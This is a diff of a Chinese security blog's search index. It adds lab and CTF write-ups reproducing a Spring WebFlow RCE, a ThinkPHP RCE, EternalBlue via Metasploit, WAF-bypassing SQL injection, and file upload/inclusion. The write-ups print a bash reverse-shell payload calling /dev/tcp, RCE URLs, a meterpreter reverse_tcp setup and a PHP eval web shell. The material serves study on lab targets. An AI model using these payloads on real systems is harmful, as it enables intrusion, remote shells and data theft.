@@ -2,8 +2,33 @@
 <search>
   <entry>
     <title><![CDATA[Welcome]]></title>
-    <url>%2F2019%2F09%2F20%2Fwelcome%2F</url>
+    <url>%2F2019%2F09%2F23%2Fwelcome%2F</url>
     <content type="text"><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[代码执行及永恒之蓝漏洞复现]]></title>
+    <url>%2F2019%2F09%2F23%2F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8F%8A%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
+    <content type="text"><![CDATA[Abstract: 复现代码执行漏洞，并用 metasploit 对 ms17_010 漏洞利用。 代码执行漏洞实验环境： vulhub Spring WebFlow 部署环境安装 docker 和 docker-compose 12345# 安装 dockercurl -s https://get.docker.com/ | sh # 安装 docker-composecurl -s https://bootstrap.pypa.io/get-pip.py | pythonpip install docker-compose docker 安装后只能启动 client，无法启动 server。解决方法如下： 1234wget https://get.docker.com/gpgrpmkeys --import ./gpgsystemctl start docker.servicedocker version 下载环境 1git clone https://github.com/vulhub/vulhub.git 启动，进入 vulhub 目录，比如本例中 vulhub/spring/CVE-2017-4927。 12# 环境启动后，访问 http://your-ip:8080docker-compose up -d 漏洞复现首先访问登录页面，用左边给的账号和密码登录系统。 图1 登录首页 访问 `http://your-ip:8080/hotels/1` ，点击“Book Hotel”，填写信息后，点击"Process"，这一步开始抓包。 图2 点击订阅 ![](/images/127spring4.png) 图3 填写信息 提交前打开"Burp"抓包。 图4 添加数据包后的相应 抓包后，在POST数据包中，添加一个字段： 1_(new java.lang.ProcessBuilder("bash","-c","bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1")).start()=vulhub 图5 URL编码 注意：URL编码 1_(new+java.lang.ProcessBuilder("bash","-c","bash+-i +&gt;%26+/dev/tcp/192.168.100.52/21+0&gt;%261")).start()=vulhub 成功执行。 thinkphp 远程代码执行漏洞12cd vulhub/thinkphp/5-rcedocker-compose up -d 环境启动后，访问 http://your-ip:8080 即可看到ThinkPHP默认启动页面。 图6 ThinkPHP默认启动页面 #### 漏洞复现 直接访问 1http://192.168.100.52:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 图7 执行phpinfo() 直接访问 1http://192.168.100.52:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=id 图8 访问结果 ### 永恒之蓝漏洞复现与利用 实验环境攻击机： Kali Linux IP 地址：192.168.100.63 工具： Metasploit nmap 靶机： Windows 7 sp1 x64 IP 地址：192.168.100.119 扫描检测先用 namp 对靶机进行端口扫描。 1namp -sS -O 192.168.100.119 结果如下图1所示： 图9 nmap扫描结果 初步判断可以使用 `Ms17_010` 漏洞。 启动 Metasploit1msfconsole #启动软件 图10 msf启动界面 123456# 切换目录msf &gt; use auxiliary/scanner/smb/smb_ms17_010# 设置靶机IP地址msf auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.100.119# 开始运行msf auxiliary(scanner/smb/smb_ms17_010) &gt; exploit 图11 运行结果 由图3可知，靶机确实存在 `Ms17_010` 漏洞。 漏洞利用12345678910111213# 切换目录msf &gt; use exploit/windows/smb/ms17_010_eternalblue # 设置靶机IPmsf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.100.119rhost =&gt; 192.168.100.119# 设置本地IPmsf exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.100.63lhost =&gt; 192.168.100.63# 设置payloadmsf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(windows/smb/ms17_010_eternalblue) &gt; 图12 基础设置 1msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit 图13 成功获取 session 获取 shell 权限。 图14 执行命令]]></content>
+      <categories>
+        <category>Web Security</category>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[获取网站flag]]></title>
+    <url>%2F2019%2F09%2F21%2F%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99flag%2F</url>
+    <content type="text"><![CDATA[Abstract: 利用 SQL 注入、文件上传、文件包含及 PHP 伪协议获取 flag。 代码审计SQL 注入寻找网页里可能与数据库进行交互的地方，由于系统比较简单，所以很容易定位到朋友圈功能。 输入老李，观察结果。 输入数字1，观察结果。 可以看出来，如果数据库里没有该好友，程序会提示找不到。尝试使用非法字符，输入 老李&#39;#，观察结果。 用 order by 确定字段个数，输入 老李&#39; order by 10，观察结果。 说明程序对敏感字符做个处理。多次尝试后发现，对 or 和 order 都进行了处理， 很难再使用 order by 语句。进行 union select 尝试。发现对 union 和 select 进行了过滤，使用双拼绕过。输入 1&#39; uniunionon selselectect 1,2,3#进行尝试。 说明字段数不符合，继续增大字段数。 当输入 1&#39; uniunionon selselectect 1,2,3,4# 时，可以正常读出数据。 手工注入使用 11&apos; uniunionon seleselectct 1,(selselectect database()),3,4# 确定当前数据库。 使用 11&apos; uniunionon seleselectct 1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables where table_schema=database()),3,4# 读取当前数据库中的表。 使用 11&apos; uniunionon seleselectct 1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns where table_schema=database() aandnd table_name=&apos;person_key&apos;),3,4# 读取表 person_key 中的字段。 使用 11&apos; uniunionon seleselectct 1,(selselectect flag frfromom friends.person_key),3,4# 读取 flag。 sqlmap 注入NOTE: 对 sqlmap 自定义注入点掌握的不熟练，但通过这个例子总结出一个步骤：先用手动注入发现点，然后把手动填写的要查询的 sql 语句用 * 代替即可。 11&apos; uniunionon seleselectct 1,(selselectect database()/* 这里就可以写*号 */),3,4 # 这里要注意使用 --tamper 命令绕过关键字符的过滤。nonrecursivereplacement.py的作用就是双拼绕过 WAF。先用 burpsuite 抓取数据包。 保存到 220.txt。然后打开 sqlmap 。 1sqlmap -r C:\Users\usr\Desktop\220.txt --tamper nonrecursivereplacement.py 12#获取数据库sqlmap -r C:\Users\usr\Desktop\220.txt --tamper nonrecursivereplacement.py --dbs 12#获取当前数据库的表sqlmap -r C:\Users\usr\Desktop\220.txt --tamper nonrecursivereplacement.py -D friends --tables 12#获取当前数据库中表person_key的字段名sqlmap -r C:\Users\usr\Desktop\220.txt --tamper nonrecursivereplacement.py -D friends -T person_key --columns 12#获取当前数据库中表person_key的字段名sqlmap -r C:\Users\usr\Desktop\220.txt --tamper nonrecursivereplacement.py -D friends -T person_key -C id.flag --dump 不知道什么原因，无法 dump 数据。 文件上传和文件包含漏洞测试打开公司档案馆，观察页面。 在新标签页中打开档案1号，观察网址构成。 1234# 原网址http://192.168.11.220/archives.php?archive=file/fr1.php# 修改 archivehttp://192.168.11.220/archives.php?archive=./file/fr1.php 发现页面正常显示。 由此可判断出，可能存在文件包含漏洞。 1http://192.168.11.220/archives.php?archive=./demo.php 在 个人档案 上传 10.zip 文件，里面有如下文件。 2.php 12// 一句话木马&lt;?php @eval($_POST["cmd"]);?&gt; 5.php 12// 主要用于显示，看能否解析 .php 文件'GIF89a'."\r\n".'&lt;?php phpinfo();?&gt;'."\n" 上传成功后。 在浏览器中输入 1http://192.168.11.220/archives.php?archive=phar://./upload/10.zip/5.php 发现 .php 是可以解析的。 之后用菜刀和蚁剑连接如下网址， 1http://192.168.11.220/archives.php?archive=phar://./upload/10.zip/2.php 发现连接不上。但是 2.php 是可以解析的，以 POST 方式 cmd=echo(123); ，网页上显示 123。 既然连不上，那我们就直接用 php 函数读取文件把文件显示出来。 1cmd=echo htmlentities(file_get_contents("/var/www/html/flag_toifsef997388003.php")); 该方法的缺点是要知道该文件的具体路径，没有菜刀和蚁剑方便。 问题与总结 SQL 注入相关的知识有些遗忘，用起来不熟练。对 sqlmap 的使用没有得心应手，先是手动注入完成以后，多次尝试使用 sqlmap 才跑出来，但最后的具体数据没有 dump 下来。本次使用的是UNION 联合查询，按理说也可以使用自定义时间盲注测试点用 sqlmap 抓数据，但尝试多次没有成功，有时间了还得再看看。 菜刀蚁剑没有成功连接，得想办法尝试绕过检测，直接上传 .php 文件，这样用工具连接可能会成功。]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>SQL 注入</tag>
+        <tag>文件上传与文件包含</tag>
+        <tag>PHP 伪协议</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[文件包含漏洞与PHP伪协议]]></title>
@@ -392,17 +417,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[IIS PUT 权限写漏洞复现]]></title>
-    <url>%2F2019%2F08%2F20%2FIIS-put-bug%2F</url>
-    <content type="text"><![CDATA[Abstract: IIS PUT写权限漏洞学习报告。 IIS put 写权限漏洞 打开VMware虚拟机，先查看 IP 地址 ​ 主机访问网站 ​ WebDAV 开启之前 ​ 使用 burpsuite 抓取数据包，将 GET 方法改为 OPTIONS 后， ​ 开启 WebDAV 服务， ​ 使用 burpsuite 抓取数据包，将 GET 方法改为 OPTIONS 后， ​ 文件所在文件夹的写权限未开启前 ​ 使用 PUT 写入文件 ​ 文件所在文件夹的写权限开启 ​ 使用 PUT 写入文件 ​ 进入目录查看，可以找到 test.txt 文件 ​ 先将一句话木马写入 test.txt 中 ​ 查看 test.txt ​ 将 脚本资源访问 打上勾 ​ 在用 MOVE 将 test.txt 修改为 test.asp ​ 查看 test.asp]]></content>
-      <categories>
-        <category>Web Security</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[练习8]]></title>
     <url>%2F2019%2F08%2F20%2Fpractice8%2F</url>
     <content type="text"><![CDATA[Abstract: HTTP 协议和 HTTPS协议的异同点， HTTP 协议中常见头部字段信息的含义及 IIS PUT写权限漏洞学习报告。 描述 HTTP 协议和 HTTPS 协议的异同点 相同点：HTTP 和 HTTPS 都采用同一个基础的协议。HTTPS并非是一种新协议，只是HTTP通信接口部分用SSL和TLS协议代替而已。HTTPS就是身披SSL协议外壳的HTTP。 不同点 名称 不同点 安全性 HTTP不安全，HTTPS安全；HTTP无需证书，无需加密，HTTPS需要证书需要加密 端口号 HTTP标准端口是80，HTTPS是443 所处层 HTTP工作与应用层，HTTPS工作与传输层 URL HTTP以http://开头，HTTPS以https://开头 通信 HTTP直接和TCP通信，HTTPS写和SSL通信，再由SSL和TCP通信。 参考文献 HTTP和HTTPS异同点 《图解HTTP》 描述 HTTP 协议中，常见头部字段信息含义。 请求首部字段 请求首部字段 含义 Accept 通知服务器，用户能够处理的媒体类型及媒体类型的相对优先级。 Accept-Charset 通知服务器用户代理支持的字符集及字符集的相对优先顺序。 Authorization 告知服务器，用户代理的认证信息。 Expect 告知服务器，期望出现的某种特定行为。 From 告知服务器使用用户代理的电子邮件地址。 Host 告知服务器，请求资源所处的互联网的主机名和端口号。 Proxy-Authorization 告知服务器认证所需要的信息。 Range 告知服务器资源的指定范围。 Referer 告知服务器请求的原始资源的URI User-Agent 将创建请求的浏览器和用户代理名称等信息传达给服务器。 响应首部字段 响应首部字段 含义 Accept-Ranges 告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。 Age 告知客户端，源服务器在多久前创建了响应。 ETag 告知客户端实体标识。 Location 响应接收方引导至某个与请求URI位置不同的资源。 Proxy-Authenticate 由代理服务器所要求的认证信息发送给客户端。 Retry-After 告知客户端应该在多久之后再次发送请求。 Server 告知客户端当前服务器上安装的HTTP服务器应用程序的信息。 Vary 可对缓存进行控制。 WWW-Authenticate 用于HTTP访问认证。 IIS put 写权限漏洞 打开VMware虚拟机，先查看 IP 地址 ​ 主机访问网站 ​ WebDAV 开启之前 ​ 使用 burpsuite 抓取数据包，将 GET 方法改为 OPTIONS 后， ​ 开启 WebDAV 服务， ​ 使用 burpsuite 抓取数据包，将 GET 方法改为 OPTIONS 后， ​ 文件所在文件夹的写权限未开启前 ​ 使用 PUT 写入文件 ​ 文件所在文件夹的写权限开启 ​ 使用 PUT 写入文件 ​ 进入目录查看，可以找到 test.txt 文件 ​ 先将一句话木马写入 test.txt 中 ​ 查看 test.txt ​ 将 脚本资源访问 打上勾 ​ 在用 MOVE 将 test.txt 修改为 test.asp ​ 查看 test.asp]]></content>
@@ -411,6 +425,17 @@
       </categories>
       <tags>
         <tag>HTTP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[IIS PUT 权限写漏洞复现]]></title>
+    <url>%2F2019%2F08%2F20%2FIIS-put-bug%2F</url>
+    <content type="text"><![CDATA[Abstract: IIS PUT写权限漏洞学习报告。 IIS put 写权限漏洞 打开VMware虚拟机，先查看 IP 地址 ​ 主机访问网站 ​ WebDAV 开启之前 ​ 使用 burpsuite 抓取数据包，将 GET 方法改为 OPTIONS 后， ​ 开启 WebDAV 服务， ​ 使用 burpsuite 抓取数据包，将 GET 方法改为 OPTIONS 后， ​ 文件所在文件夹的写权限未开启前 ​ 使用 PUT 写入文件 ​ 文件所在文件夹的写权限开启 ​ 使用 PUT 写入文件 ​ 进入目录查看，可以找到 test.txt 文件 ​ 先将一句话木马写入 test.txt 中 ​ 查看 test.txt ​ 将 脚本资源访问 打上勾 ​ 在用 MOVE 将 test.txt 修改为 test.asp ​ 查看 test.asp]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
